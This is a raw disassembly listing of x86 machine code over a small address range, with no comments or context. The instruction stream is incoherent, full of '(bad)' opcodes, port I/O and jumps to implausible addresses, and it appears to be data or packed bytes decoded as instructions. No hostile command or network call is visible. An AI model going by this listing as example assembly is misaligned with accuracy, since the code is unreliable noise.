  410ef5:	xor    al,0x97
  410ef7:	int3   
  410ef8:	jmp    0x9f8fa91c
  410efd:	(bad)  
  410efe:	and    DWORD PTR [esi-0x52],ebp
  410f01:	addr16 pop eax
  410f03:	mov    ds:0xf9f24c39,al
  410f08:	fadd   QWORD PTR [edx-0x27]
  410f0b:	(bad)  
  410f0c:	fisttp QWORD PTR [edx+0x4]
  410f0f:	and    DWORD PTR [esp+eiz*4-0x22],ecx
  410f13:	add    al,bl
  410f15:	mov    esp,0x119302da
  410f1a:	mov    edi,0x7f680142
  410f1f:	(bad)  
  410f20:	int    0x7a
  410f22:	pop    esi
  410f23:	js     0x410f63
  410f25:	jbe    0x410f9d
  410f27:	mov    ecx,0x4e6f3e47
  410f2c:	stos   DWORD PTR es:[edi],eax
  410f2d:	lods   al,BYTE PTR ds:[esi]
  410f2e:	cmp    eax,0xa77dba3f
  410f33:	imul   ecx,ecx,0xffffffc7
  410f36:	or     BYTE PTR [esi-0x57],ch
  410f39:	fwait
  410f3a:	mov    ds,WORD PTR [eax-0x6c]
  410f3d:	jnp    0x410fa2
  410f3f:	mov    edx,DWORD PTR [ebx+0x57]
  410f42:	mov    dh,0x7a
  410f44:	in     eax,dx
  410f45:	sbb    al,0xf
  410f47:	and    eax,DWORD PTR [ebx-0x6b6d7c5b]
  410f4d:	fild   QWORD PTR [edi-0x76]
  410f50:	xor    eax,ecx
  410f52:	gs push 0xdf4ca915
  410f58:	mov    ah,0xd1
  410f5a:	out    dx,eax
  410f5b:	dec    ebp
  410f5c:	xchg   DWORD PTR [edx],ecx
  410f5e:	jb     0x410efb
  410f60:	mov    ecx,0x144b5595
  410f65:	push   esp
  410f66:	fs mov esi,0x48ba887d
  410f6c:	push   edx
  410f6d:	and    eax,0x53cd2c96
  410f72:	js     0x410fed
  410f74:	jecxz  0x410efb
  410f76:	mov    WORD PTR [ecx-0x6d5b7fd],es
  410f7c:	fs push cs
  410f7e:	adc    DWORD PTR [eax+0x7552444a],ecx
  410f84:	push   esp
  410f85:	sahf   
  410f86:	inc    ebp
  410f87:	(bad)  
  410f88:	adc    eax,0x85bf82df
  410f8d:	sbb    eax,0x9afa2234
  410f92:	mov    al,0x35
  410f94:	mov    ds:0xc9f0a879,al
  410f99:	out    dx,eax
  410f9a:	(bad)  
  410f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f9c:	push   ss
  410f9d:	mov    ebp,0x1c25a342
  410fa2:	xchg   esi,eax
  410fa3:	push   0xffffffde
  410fa5:	cmp    al,0x41
  410fa7:	mov    cl,0xa
  410fa9:	mov    esi,0x43054ff9
  410fae:	nop
  410faf:	xor    ch,BYTE PTR [ebx]
  410fb1:	test   al,0x4c
  410fb3:	aaa    
  410fb4:	lds    eax,FWORD PTR [esi+0x73]
  410fb7:	test   BYTE PTR [edi+0x24],dh
  410fba:	mov    ecx,0xc9760c8
  410fbf:	hlt    
  410fc0:	jbe    0x410f6f
  410fc2:	cmp    esi,edi
  410fc4:	pusha  
  410fc5:	mov    ebp,0xa59b1500
  410fca:	out    0xa6,al
  410fcc:	hlt    
  410fcd:	pop    edx
  410fce:	clc    
  410fcf:	fidivr WORD PTR [ecx+0x55]
  410fd2:	gs jl  0x410fe4
  410fd5:	repz mov dh,0xb0
  410fd8:	mov    ds:0x99ee9198,eax
  410fdd:	popa   
  410fde:	jp     0x410f8c
  410fe0:	jge    0x410f87
  410fe2:	lds    ebp,FWORD PTR [edx+0x58ad9dd6]
  410fe8:	das    
  410fe9:	lahf   
  410fea:	inc    eax
  410feb:	mov    esp,0x6601aaf7
  410ff0:	shl    DWORD PTR [esp+edx*4+0x72200952],cl
  410ff7:	clc    
  410ff8:	clc    
  410ff9:	push   esp
  410ffa:	adc    DWORD PTR [eax+eax*4+0x2b60acf6],ecx
  411001:	sub    cl,BYTE PTR ds:0xe1d5893a
  411007:	mov    al,ds:0x18b74e00
  41100c:	dec    ebx
  41100d:	stc    
  41100e:	jmp    0x74913532
  411013:	push   edx
  411014:	shl    DWORD PTR [ecx-0x11],0x62
  411018:	repz jo 0x411002
  41101b:	or     ecx,DWORD PTR [ecx-0x1e]
  41101e:	sbb    eax,0xd38c6851
  411023:	faddp  st(5),st
  411025:	fnsave [eax]
  411027:	repnz jecxz 0x41103f
  41102a:	mov    WORD PTR ss:[ebp+0x35],es
  41102e:	rcl    ch,cl
  411030:	es ret 
  411032:	stos   DWORD PTR es:[edi],eax
  411033:	jle    0x411054
  411035:	push   edx
  411036:	add    bl,ch
  411038:	imul   edi,DWORD PTR [esi+0x5c],0x44af2fea
  41103f:	push   ss
  411040:	pop    ebp
  411041:	pop    edi
  411042:	ror    bh,0x37
  411045:	rol    DWORD PTR [edi],1
  411047:	xchg   BYTE PTR [edx],al
  411049:	enter  0xe3a5,0x51
  41104d:	in     al,0x4e
  41104f:	cmc    
  411050:	xchg   ebp,eax
  411051:	xchg   edx,eax
  411052:	cmp    eax,0x455cb6aa
  411057:	mov    ebx,0xcf38f2d9
  41105c:	add    eax,0xb4d101b7
  411061:	stc    
  411062:	xor    eax,0x538f9489
  411067:	or     DWORD PTR [esi-0x6da6f359],ebp
  41106d:	sti    
  41106e:	mov    bl,0xbd
  411070:	fsub   st,st(4)
  411072:	inc    esi
  411073:	cmp    DWORD PTR [eax-0x5d],edx
  411076:	inc    ecx
  411077:	stc    
  411078:	adc    ebx,ecx
  41107a:	lods   al,BYTE PTR ds:[esi]
  41107b:	call   0x32bb:0x3a961854
  411082:	xchg   ebp,eax
  411083:	xor    esi,DWORD PTR [eax-0x6e20cbf6]
  411089:	xor    eax,0xedb24dda
  41108e:	cmp    DWORD PTR [ecx+ebp*2-0x4e],ebx
  411092:	loop   0x41104f
  411094:	sub    al,0xa0
  411096:	xor    esp,0x54
  411099:	not    DWORD PTR [eax+0x227d7525]
  41109f:	push   cs
  4110a0:	mov    edi,0xd47d9cad
  4110a5:	(bad)
  4110a8:	jnp    0x41107a
  4110aa:	inc    eax
  4110ab:	pop    edi
  4110ac:	xchg   ecx,eax
  4110ad:	inc    edi
  4110ae:	imul   ebx,DWORD PTR [ecx],0x8655ae57
  4110b4:	add    DWORD PTR [ecx],edx
  4110b6:	arpl   WORD PTR [eax-0x2],sp
  4110b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110bb:	(bad)  
  4110bc:	in     eax,dx
  4110bd:	sbb    edi,eax
  4110bf:	fadd   QWORD PTR [ebx-0x35]
  4110c2:	pop    esp
  4110c3:	inc    edi
  4110c4:	cs ret 0xe20b
  4110c8:	push   eax
  4110c9:	jge    0x411053
  4110cb:	mov    ecx,DWORD PTR [edx-0x18dcd066]
  4110d1:	mov    ecx,0xe79054dc
  4110d6:	jmp    0x41107e
  4110d8:	sub    ah,BYTE PTR [ebp-0x702937cb]
  4110de:	les    esp,FWORD PTR [ecx+0x6a]
  4110e1:	out    dx,al
  4110e2:	push   edi
  4110e3:	jne    0x41115f
  4110e5:	mov    ah,ah
  4110e7:	(bad)  
  4110e8:	scas   eax,DWORD PTR es:[edi]
  4110e9:	xchg   cx,ax
  4110eb:	mov    ebx,DWORD PTR [edx+eiz*1-0x31245f69]
  4110f2:	sub    DWORD PTR [edi+0x70878e7e],edx
  4110f8:	sar    BYTE PTR [ecx-0x20],1
  4110fb:	test   al,0x80
  4110fd:	push   ds
  4110fe:	aas    
  4110ff:	aam    0x9f
  411101:	int    0xc6
  411103:	push   ebp
  411104:	fwait
  411105:	scas   al,BYTE PTR es:[edi]
  411106:	mov    ah,0xe2
  411108:	mov    ebp,esi
  41110a:	xchg   DWORD PTR ds:0x5cae99f0,edx
  411110:	add    eax,0xee71ed43
  411115:	pop    edx
  411116:	inc    ecx
  411117:	popa   
  411118:	les    ebx,FWORD PTR [ecx+edi*1+0x43]
  41111c:	push   eax
  41111d:	pushf  
  41111e:	and    eax,0x119d0913
  411123:	sbb    al,0x4b
  411125:	jno    0x411162
  411127:	xor    esi,DWORD PTR [edx]
  411129:	mov    dl,ah
  41112b:	call   0xd1114ade
  411130:	and    esp,esi
  411132:	stos   BYTE PTR es:[edi],al
  411133:	stos   DWORD PTR es:[edi],eax
  411134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411135:	or     dl,BYTE PTR [eax-0x1a]
  411138:	fiadd  WORD PTR [ebx+0x8]
  41113b:	fadd   DWORD PTR [ecx+0x1c3c9325]
  411141:	aam    0xe6
  411143:	mov    al,dl
  411145:	pop    ss
  411146:	sbb    al,0x48
  411148:	adc    eax,0x1ae5b850
  41114d:	ja     0x411128
  41114f:	cmp    al,ch
  411151:	cmp    ecx,DWORD PTR [ecx]
  411153:	push   ecx
  411154:	fstp   TBYTE PTR [ebx]
  411156:	pop    es
  411157:	(bad)  
  411158:	jl     0x4110da
  41115a:	test   BYTE PTR [ebp+0x70a5ba7a],dh
  411160:	in     eax,0x62
  411162:	and    cl,BYTE PTR [edx+0x2a]
  411165:	or     esi,esp
  411167:	sbb    eax,0xfa7a4a4c
  41116c:	cdq    
  41116d:	jmp    0xbc54f89e
  411172:	cmpxchg BYTE PTR ds:[ebx],ah
  411176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411177:	jecxz  0x4111c8
  411179:	inc    ecx
  41117a:	mov    esp,0x7245865d
  41117f:	test   BYTE PTR [eax],0xa0
  411182:	or     al,0x7b
  411184:	clc    
  411185:	daa    
  411186:	ss test ch,bl
  411189:	imul   esp,ebx,0xffffffed
  41118c:	dec    ebp
  41118d:	mov    ds:0xc672b814,al
  411192:	fild   WORD PTR [edx]
  411194:	stos   DWORD PTR es:[edi],eax
  411195:	jmp    0xc0c1:0x3eaa9830
  41119c:	add    eax,0xc1b76747
  4111a1:	adc    bh,dl
  4111a3:	int    0x87
  4111a5:	sbb    BYTE PTR [ebx],bl
  4111a7:	pop    ecx
  4111a8:	sahf   
  4111a9:	dec    ebp
  4111aa:	and    edx,edi
  4111ac:	fmul   QWORD PTR [ecx+eiz*8+0x3f0d5f1c]
  4111b3:	std    
  4111b4:	mov    bl,0x53
  4111b6:	and    al,0xad
  4111b8:	(bad)  
  4111b9:	jge    0x4111a6
  4111bb:	ja     0x41114b
  4111bd:	add    al,ch
  4111bf:	inc    ecx
  4111c0:	xor    DWORD PTR [esi+0x31],esi
  4111c3:	sti    
  4111c4:	jp     0x411238
  4111c6:	push   edi
  4111c7:	dec    ebx
  4111c8:	neg    cl
  4111ca:	jle    0x4111d9
  4111cc:	dec    eax
  4111cd:	cdq    
  4111ce:	mul    DWORD PTR [eax-0x77964f2d]
  4111d4:	call   0x6423eb14
  4111d9:	dec    eax
  4111da:	in     al,dx
  4111db:	mov    ebx,0xf75f49fe
  4111e0:	mov    WORD PTR [esi+0x1],es
  4111e3:	cs ins DWORD PTR es:[edi],dx
  4111e5:	ja     0x4111e7
  4111e7:	repnz aad 0x24
  4111ea:	pop    ecx
  4111eb:	sahf   
  4111ec:	aas    
  4111ed:	jae    0x4111b9
  4111ef:	inc    ebp
  4111f0:	cmp    esp,DWORD PTR [ecx-0x3d]
  4111f3:	into   
  4111f4:	adc    ch,BYTE PTR [edi-0x9]
  4111f7:	xlat   BYTE PTR ds:[ebx]
  4111f8:	(bad)  
  4111f9:	cmc    
  4111fa:	xor    cl,BYTE PTR [edx+0x7f]
  4111fd:	pop    esp
  4111fe:	or     ebx,DWORD PTR [edx]
  411200:	retf   0x4aa7
  411203:	scas   al,BYTE PTR es:[edi]
  411204:	scas   al,BYTE PTR es:[edi]
  411205:	sub    DWORD PTR [eax-0x62],ebp
  411208:	daa    
  411209:	enter  0x3e,0xe2
  41120d:	loop   0x41123b
  41120f:	xor    ebp,DWORD PTR [ecx+ebx*2]
  411212:	retf   
  411213:	ret    
  411214:	mov    dh,0x3
  411216:	inc    eax
  411217:	fisubr DWORD PTR [ebx+0x53]
  41121a:	popa   
  41121b:	jb     0x4111fa
  41121d:	cmp    esi,DWORD PTR [ecx+0x3ce0c2c4]
  411223:	daa    
  411224:	mov    esp,0x3393ae19
  411229:	mov    ch,0xe
  41122b:	test   DWORD PTR [edx],ebx
  41122d:	sub    eax,0x6d866978
  411232:	sub    BYTE PTR [ecx-0x54],al
  411235:	mov    bl,BYTE PTR [esi-0x3fdf27b5]
  41123b:	add    cl,BYTE PTR [edi+eax*4+0x545bccb5]
  411242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411243:	sbb    eax,0x79866926
  411248:	and    ah,0x0
  41124b:	pop    ebx
  41124c:	push   ds
  41124d:	dec    edx
  41124e:	mov    ah,0xd7
  411250:	ds fs push ecx
  411253:	push   eax
  411254:	imul   esi,DWORD PTR [edx-0x2d198f63],0x57a501f9
  41125e:	outs   dx,BYTE PTR ds:[esi]
  41125f:	push   cs
  411260:	mov    eax,0x7dd716e0
  411265:	repz cmp al,0xc4
  411268:	ret    0x7022
  41126b:	add    ebp,DWORD PTR [ebx-0x1f]
  41126e:	js     0x4112d1
  411270:	push   edx
  411271:	inc    ebx
  411272:	jg     0x41121f
  411274:	cdq    
  411275:	in     eax,0x39
  411277:	adc    BYTE PTR [ecx-0x3c8caef9],ch
  41127d:	stos   DWORD PTR es:[edi],eax
  41127e:	inc    ecx
  41127f:	mov    ecx,0x5c73fbb6
  411284:	cld    
  411285:	aaa    
  411286:	adc    dh,cl
  411288:	mov    bl,0x35
  41128a:	or     DWORD PTR [eax-0x8fb56c1],ecx
  411290:	jo     0x4112c7
  411292:	jo     0x4112f6
  411294:	pusha  
  411295:	adc    al,0xd9
  411297:	(bad)  [ebx-0x48]
  41129a:	xchg   ebx,eax
  41129b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41129c:	test   BYTE PTR [ecx+0x44],al
  41129f:	cli    
  4112a0:	std    
  4112a1:	mov    BYTE PTR [edx],dh
  4112a3:	(bad)  
  4112a4:	cmp    al,0x80
  4112a6:	or     BYTE PTR ds:0x8f45b827,ah
  4112ac:	push   cs
  4112ad:	or     DWORD PTR [esi+0x3c],esi
  4112b0:	cmp    eax,0x7c2b5111
  4112b5:	pushf  
  4112b6:	cmp    ah,BYTE PTR ds:0xdc441cf3
  4112bc:	push   es
  4112bd:	xor    edx,edx
  4112bf:	xchg   DWORD PTR [eax],edx
  4112c1:	lods   al,BYTE PTR ds:[esi]
  4112c2:	shl    DWORD PTR [edx+0x7d],1
  4112c5:	or     BYTE PTR [ebp-0x37],0x1d
  4112c9:	xchg   esp,eax
  4112ca:	cmp    al,0xcc
  4112cc:	ss in  al,0xe9
  4112cf:	(bad)  
  4112d1:	ret    0x5022
  4112d4:	into   
  4112d5:	stos   DWORD PTR es:[edi],eax
  4112d6:	push   0x7ea69bb2
  4112db:	mov    dl,0x28
  4112dd:	fst    DWORD PTR [ebp-0x5]
  4112e0:	(bad)  
  4112e1:	ins    DWORD PTR es:[edi],dx
  4112e2:	call   0x58c7:0x5ea62f16
  4112e9:	test   al,0x30
  4112eb:	xlat   BYTE PTR ds:[ebx]
  4112ec:	push   esp
  4112ed:	js     0x4112c7
  4112ef:	or     eax,0x12e458fe
  4112f4:	dec    edi
  4112f5:	scas   al,BYTE PTR es:[edi]
  4112f6:	dec    edi
  4112f7:	je     0x411302
  4112f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112fa:	rcl    esi,1
  4112fc:	push   ebp
  4112fd:	lahf   
  4112fe:	mov    al,ds:0xb0ed322c
  411303:	adc    edx,ecx
  411305:	pop    ds
  411306:	xchg   DWORD PTR [eax-0x18],edx
  411309:	sub    ch,BYTE PTR [eax+0x780140bd]
  41130f:	push   0x3d
  411311:	jnp    0x41137d
  411313:	sbb    ecx,DWORD PTR ds:0x87fd7475
  411319:	xor    DWORD PTR [ebp+0x25a3fcb0],esi
  41131f:	dec    BYTE PTR [eax]
  411321:	push   edi
  411322:	sub    al,0x48
  411324:	sbb    eax,0x19e4f4e1
  411329:	or     BYTE PTR [esi+esi*8+0xa417465],ch
  411330:	shl    BYTE PTR [edx+0x23c54cbf],cl
  411336:	ret    0x7017
  411339:	or     ebx,ecx
  41133b:	icebp  
  41133c:	repz std 
  41133e:	out    dx,eax
  41133f:	mov    DWORD PTR [edx+0x4bd6fab7],eax
  411345:	adc    ebp,ebp
  411347:	mov    ah,cl
  411349:	jecxz  0x4113a6
  41134b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41134c:	mov    al,ds:0xe4baf55d
  411351:	setp   BYTE PTR [eax]
  411354:	push   ebx
  411355:	retf   0x2823
  411358:	(bad)  
  411359:	int    0xd3
  41135b:	mov    cl,bh
  41135d:	addr16 mov eax,ds:0xf3ac
  411361:	add    DWORD PTR [esi+0x7bb8a336],esp
  411367:	fstp   QWORD PTR [ebp-0x15025618]
  41136d:	xor    ah,ah
  41136f:	xor    eax,0x65e3ada0
  411374:	rcl    bh,cl
  411376:	xlat   BYTE PTR ds:[ebx]
  411377:	cmp    BYTE PTR [eax+0x53efd741],al
  41137d:	and    cl,bl
  41137f:	test   eax,0x91b7e0cd
  411384:	mov    al,ds:0x188a8270
  411389:	dec    ebp
  41138a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41138b:	cmp    al,0xe5
  41138d:	jnp    0x411391
  41138f:	mov    dl,0x91
  411391:	push   ds
  411392:	aad    0x8a
  411394:	cmp    BYTE PTR [ecx+0x5d],bh
  411397:	bswap  ebp
  411399:	xchg   esi,eax
  41139a:	pusha  
  41139b:	cwde   
  41139c:	cmp    ah,dh
  41139e:	and    ebp,ecx
  4113a0:	sbb    BYTE PTR [ecx+ebp*1],ah
  4113a3:	pop    edx
  4113a4:	inc    ecx
  4113a5:	inc    edx
  4113a6:	or     BYTE PTR [ecx+0x45],ah
  4113a9:	inc    esp
  4113aa:	xchg   dh,bl
  4113ac:	(bad)  
  4113ae:	inc    edx
  4113af:	pop    edi
  4113b0:	je     0x411427
  4113b2:	xor    al,0xdc
  4113b4:	sbb    edi,DWORD PTR [ecx+eiz*2-0x163f4d10]
  4113bb:	pop    esp
  4113bc:	pop    esp
  4113bd:	lea    esp,gs:[ebp+0x2b0a111d]
  4113c4:	cmp    eax,0x6b02aeb8
  4113c9:	mov    ecx,0x8156a818
  4113ce:	out    0xd5,eax
  4113d0:	call   0xac14:0xea831070
  4113d7:	sub    eax,0x7eef52be
  4113dc:	test   dl,ch
  4113de:	sub    DWORD PTR [ecx+edi*1],0xb53b1087
  4113e5:	sti    
  4113e6:	mov    ebp,0x6511d5a8
  4113eb:	mov    ebx,0x5998a871
  4113f0:	ja     0x411466
  4113f2:	jg     0x411375
  4113f4:	inc    ebx
  4113f5:	out    dx,al
  4113f6:	mov    ah,0xbc
  4113f8:	call   0xe372c1c0
  4113fd:	inc    esp
  4113fe:	push   es
  4113ff:	mov    DWORD PTR [ecx-0x2d],edx
  411402:	jno    0x411460
  411404:	loope  0x411439
  411406:	adc    esi,ecx
  411408:	out    dx,al
  411409:	js     0x41145a
  41140b:	or     BYTE PTR [edx],cl
  41140d:	addr16 mov ebp,0x56a5a31b
  411413:	stos   DWORD PTR es:[edi],eax
  411414:	int    0xf9
  411416:	mov    esp,0x4d955e66
  41141b:	push   cs
  41141c:	xchg   edi,eax
  41141d:	and    BYTE PTR [eax-0x4cfc9058],0xf
  411424:	sub    al,0x6b
  411426:	div    DWORD PTR [ebp-0x22]
  411429:	rcr    cl,1
  41142b:	mov    WORD PTR ss:[edx-0x46],ds
  41142f:	out    dx,al
  411430:	into   
  411431:	pop    ss
  411432:	aaa    
  411433:	fldcw  WORD PTR [ecx-0x2]
  411436:	retf   
  411437:	mov    edx,DWORD PTR [edx]
  411439:	or     al,0xa9
  41143b:	rcl    bh,1
  41143d:	fs cmc 
  41143f:	in     eax,0xea
  411441:	fdivr  st(0),st
  411443:	or     al,0xa9
  411445:	aam    0xc1
  411447:	loope  0x4113dd
  411449:	les    eax,FWORD PTR [esi+0x4b]
  41144c:	mov    eax,ds:0xd100d603
  411451:	ss pop ebx
  411453:	or     BYTE PTR [esi+ebx*8+0x7cb25efe],dh
  41145a:	arpl   WORD PTR [ebp+0x1b6a173c],bp
  411460:	xor    eax,0x2f774cd6
  411465:	jge    0x411490
  411467:	pop    esp
  411468:	imul   ebx,DWORD PTR [ebx],0xffffffe7
  41146b:	sub    bh,BYTE PTR ds:0x92adac3e
  411471:	ins    DWORD PTR es:[edi],dx
  411472:	push   ds
  411473:	mov    ecx,0x5bbf25b3
  411478:	sub    DWORD PTR [ecx-0x4b],esi
  41147b:	iret   
  41147c:	inc    ebp
  41147d:	and    edx,eax
  41147f:	loope  0x411419
  411481:	inc    esi
  411482:	arpl   WORD PTR [edi+0x79397b21],bp
  411488:	data16 outs dx,BYTE PTR ds:[esi]
  41148a:	leave  
  41148b:	and    eax,0x104bd5c4
  411490:	retf   
  411491:	int    0x71
  411493:	aad    0x96
  411495:	test   DWORD PTR [ecx],eax
	...
  411513:	add    BYTE PTR [eiz*8+0x7fff35be],bh
  41151a:	mov    edi,0x96dab9ed
  41151f:	mov    ch,bl
  411521:	pop    ebp
  411522:	sub    al,0xab
  411524:	sub    eax,0x6b0000bf
  411529:	pop    es
  41152a:	add    BYTE PTR [eax],al
  41152c:	and    al,0x35
  41152e:	push   ebp
  41152f:	and    BYTE PTR [edi-0x35],ah
  411532:	adc    DWORD PTR [esp+ecx*2-0x7a],esi
  411536:	loop   0x4115aa
  411538:	adc    bh,BYTE PTR [eax+edi*8+0x69]
  41153c:	dec    eax
  41153d:	add    eax,0xaf835e56
  411542:	pop    ebx
  411543:	stc    
  411544:	cdq    
  411545:	inc    esp
  411546:	xor    cl,BYTE PTR [edx+0x2e]
  411549:	adc    dl,al
  41154b:	cmc    
  41154c:	dec    esp
  41154d:	sbb    al,0x66
  41154f:	lods   al,BYTE PTR ds:[esi]
  411550:	sbb    dh,dl
  411552:	fld    DWORD PTR ds:0x2b0d7bf9
  411558:	cmp    ebx,DWORD PTR [edi-0xf]
  41155b:	pop    edi
  41155c:	lea    eax,[eax-0x6ffd1f23]
  411562:	into   
  411563:	int    0x1f
  411565:	fdivp  st(2),st
  411567:	push   0x89d7c65a
  41156c:	rcl    BYTE PTR ds:[edi+0x6c],0x8f
  411571:	push   edi
  411572:	aas    
  411573:	mov    ds:0x447556fd,al
  411578:	lods   al,BYTE PTR ds:[esi]
  411579:	outs   dx,BYTE PTR ds:[esi]
  41157a:	fwait
  41157b:	mov    ah,0x86
  41157d:	(bad)  
  41157e:	mov    ds:0xe2e8e86a,eax
  411583:	sub    DWORD PTR [eax+ebp*2],esp
  411586:	stos   DWORD PTR es:[edi],eax
  411587:	aam    0xf1
  411589:	add    BYTE PTR [ecx-0x60e5c561],bh
  41158f:	out    0x44,al
  411591:	push   esp
  411592:	xchg   ebp,eax
  411593:	push   0xffffff9b
  411595:	imul   edx,DWORD PTR [edi+ebp*1+0x49],0xffffff90
  41159a:	mov    ecx,0x1b49e8c9
  41159f:	cwde   
  4115a0:	mov    ebp,0x4b333341
  4115a5:	sub    al,0x5e
  4115a7:	dec    edx
  4115a8:	mov    cl,0xd0
  4115aa:	inc    eax
  4115ab:	jmp    0x23d532a7
  4115b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b1:	cmc    
  4115b2:	rcr    DWORD PTR [edi+edi*4],cl
  4115b5:	sub    ebx,DWORD PTR [ebp+0x6a]
  4115b8:	and    edi,edx
  4115ba:	xor    ebp,0x46041ab6
  4115c0:	daa    
  4115c1:	sbb    eax,0xa0121f47
  4115c6:	call   0xdde3:0x7b00a19d
  4115cd:	push   esi
  4115ce:	cld    
  4115cf:	jl     0x411573
  4115d1:	jbe    0x411618
  4115d3:	adc    eax,0xc7112614
  4115d8:	scas   eax,DWORD PTR es:[edi]
  4115d9:	test   DWORD PTR [ebx+0x4a5de0cf],ebx
  4115df:	sub    al,0x52
  4115e1:	in     eax,dx
  4115e2:	mov    WORD PTR [edi],?
  4115e4:	imul   esi,DWORD PTR [ebp+0x89db860],0xa556bcf4
  4115ee:	stos   BYTE PTR es:[edi],al
  4115ef:	aad    0xe3
  4115f1:	imul   esp,DWORD PTR [esi],0xa2439a6c
  4115f7:	add    BYTE PTR [ebx],dl
  4115f9:	pop    ecx
  4115fa:	fcomp  DWORD PTR [edi+0x3e]
  4115fd:	add    eax,0xa48eae72
  411602:	jmp    0x41164b
  411604:	mov    esp,0x172615a5
  411609:	ins    DWORD PTR es:[edi],dx
  41160a:	add    dl,BYTE PTR [edi-0x21]
  41160d:	jmp    0x4a4e:0x3e86d5a6
  411614:	jae    0x411612
  411616:	in     eax,dx
  411617:	cld    
  411618:	addr16 fwait
  41161a:	ds stc 
  41161c:	rol    DWORD PTR [ecx],cl
  41161e:	cmp    DWORD PTR [eax-0x377b05ed],eax
  411624:	jo     0x411629
  411626:	sub    al,BYTE PTR [esi-0x58]
  411629:	repz loope 0x411692
  41162c:	mov    ecx,0x6a790156
  411631:	jmp    0x41169c
  411633:	ror    ecx,1
  411635:	xchg   esp,eax
  411636:	jbe    0x411628
  411638:	ins    BYTE PTR es:[di],dx
  41163a:	ret    
  41163b:	mov    ecx,0x28b94ba7
  411640:	dec    esi
  411641:	jae    0x41166c
  411643:	sbb    al,0x66
  411645:	jne    0x411685
  411647:	adc    dh,dl
  411649:	xor    BYTE PTR [ebx],bl
  41164b:	mov    esi,DWORD PTR [ecx]
  41164d:	in     eax,0x70
  41164f:	into   
  411650:	and    eax,0x1a24c8b
  411655:	push   eax
  411656:	scas   al,BYTE PTR es:[edi]
  411657:	fsubr  QWORD PTR [eax-0xaa7eb36]
  41165d:	pop    eax
  41165e:	mov    eax,0xd34cb0db
  411663:	mov    eax,ebx
  411665:	fisub  DWORD PTR [eax+edx*1+0x68bc448b]
  41166c:	outs   dx,DWORD PTR ds:[esi]
  41166d:	cld    
  41166e:	jmp    0x3d3caab9
  411673:	fcomp  DWORD PTR [esi+0x47]
  411676:	jnp    0x41161b
  411678:	mov    esp,0x16a1e018
  41167d:	faddp  st(3),st
  41167f:	inc    DWORD PTR ds:0xd07feefc
  411685:	sub    ebp,DWORD PTR [eax+eax*8]
  411688:	ffreep st(6)
  41168a:	ret    0xf36e
  41168d:	dec    edi
  41168e:	pop    ebx
  41168f:	rcl    DWORD PTR [eax+0x3af3b928],0x1e
  411696:	test   BYTE PTR [edi+0x18],bl
  411699:	adc    BYTE PTR [edi+0x46],dl
  41169c:	popf   
  41169d:	enter  0x9607,0xa0
  4116a1:	or     al,0xcb
  4116a3:	lea    esp,[edx-0x563c3d23]
  4116a9:	cwde   
  4116aa:	in     al,dx
  4116ab:	sub    eax,0xb6f5db1e
  4116b0:	inc    edx
  4116b1:	or     eax,0x751799de
  4116b6:	and    edx,DWORD PTR [esi]
  4116b8:	adc    BYTE PTR [ecx+0x68],bl
  4116bb:	std    
  4116bc:	sbb    ebp,DWORD PTR [ebp-0x6860e2d9]
  4116c2:	push   0x5d8c5ef1
  4116c7:	dec    BYTE PTR [edi]
  4116c9:	shl    BYTE PTR [esi],1
  4116cb:	mov    cl,dh
  4116cd:	mov    BYTE PTR [ecx],0xc5
  4116d0:	retf   0x14dd
  4116d3:	enter  0xb147,0x79
  4116d7:	mov    DWORD PTR [edi-0x262eb15f],esi
  4116dd:	and    cl,ch
  4116df:	push   esi
  4116e0:	and    cl,BYTE PTR [edx]
  4116e2:	shl    BYTE PTR ss:[ebx+0x39],0xb6
  4116e7:	fidivr WORD PTR [ebp-0x33e04697]
  4116ed:	inc    esi
  4116ee:	push   ebx
  4116ef:	dec    ecx
  4116f0:	es xchg ebp,eax
  4116f2:	out    dx,al
  4116f3:	adc    edi,esi
  4116f5:	out    dx,eax
  4116f6:	out    dx,al
  4116f7:	icebp  
  4116f8:	xor    edx,DWORD PTR [ecx]
  4116fa:	mov    eax,0xc2a3d9b
  4116ff:	arpl   WORD PTR [esi],sp
  411701:	xor    al,0x27
  411703:	ret    
  411704:	fucomi st,st(1)
  411706:	test   al,0x2b
  411708:	loope  0x411777
  41170a:	push   es
  41170b:	jo     0x411766
  41170d:	or     BYTE PTR [bx+di+0x2c],cl
  411711:	out    dx,al
  411712:	jb     0x4116b7
  411714:	dec    esi
  411715:	push   edx
  411716:	inc    esi
  411717:	add    esp,esp
  411719:	or     BYTE PTR [edi-0x215a3841],dl
  41171f:	mov    eax,ds:0xc7c8339f
  411724:	clc    
  411725:	and    BYTE PTR [ebx+0x59],ah
  411728:	ror    BYTE PTR [ebx+0x57],0xea
  41172c:	cwde   
  41172d:	bound  esp,QWORD PTR [ecx+0x2cde102e]
  411733:	pop    esp
  411734:	arpl   dx,si
  411736:	and    BYTE PTR [ebp-0x3fa322ce],ah
  41173c:	jo     0x41179c
  41173e:	mov    ecx,0xf62370a
  411743:	pop    ebx
  411744:	mov    dl,0x84
  411746:	xor    bh,BYTE PTR [edx+ebp*1-0x28]
  41174a:	in     eax,dx
  41174b:	in     eax,dx
  41174c:	jl     0x4116f0
  41174e:	push   ebp
  41174f:	sbb    DWORD PTR [ebx-0x47873a33],ebp
  411755:	iret   
  411756:	out    dx,eax
  411757:	repz in al,dx
  411759:	jno    0x411705
  41175b:	and    DWORD PTR ds:[ebx],esp
  41175e:	frndint 
  411760:	in     eax,dx
  411761:	dec    ecx
  411762:	xor    cl,BYTE PTR [eax]
  411764:	stos   BYTE PTR es:[edi],al
  411765:	jmp    0xa145:0x84d22bf2
  41176c:	int3   
  41176d:	add    eax,0x14d2fced
  411772:	test   eax,0xbf56c788
  411777:	ins    DWORD PTR es:[edi],dx
  411778:	test   eax,0x22607748
  41177d:	test   eax,0xe6ff926e
  411782:	fs pop esi
  411784:	pop    edx
